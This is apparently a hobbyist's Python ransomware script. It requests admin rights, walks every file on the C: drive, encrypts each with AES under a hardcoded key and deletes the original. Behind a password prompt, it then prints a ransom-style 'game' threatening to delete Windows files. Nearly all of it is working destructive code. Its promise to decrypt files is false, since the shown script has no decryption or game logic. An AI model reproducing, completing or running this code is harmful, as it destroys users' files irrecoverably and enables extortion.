import time
import random
import os, random, struct
import admin
from Crypto.Cipher import AES # @UnresolvedImport

if not admin.isUserAdmin():
        admin.runAsAdmin()


def encrypt_file(key, in_filename, out_filename, chunksize):
    #source: http://eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))



password = raw_input("Oh god dont do this accidentally, whats the password: ")  # @UndefinedVariable
if password != "basil":
    exit()
rootdir = 'C:\\'

for subdir, dirs, files in os.walk(rootdir):
    for file in files:
        if file != "pagefile.sys":
            filename = os.path.join(subdir, file)
        
            encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", filename, None, 64*1024)
            try: 
                os.remove(filename)
            except OSError:
                pass
             
        



#just a fun sad thing I made
print("Lets play a little game shall we?")
print("Guess a number between 1 and 6")
print("Every time you guess the wrong number a percentage of windows32 is deleted")
print("You have to survive 6 guesses")
print("Also all the files on your computer are now encrypted, meaning that if you")
print(" exit this program you will not get any of your files back.")
print("If you survive they will be decrypted")
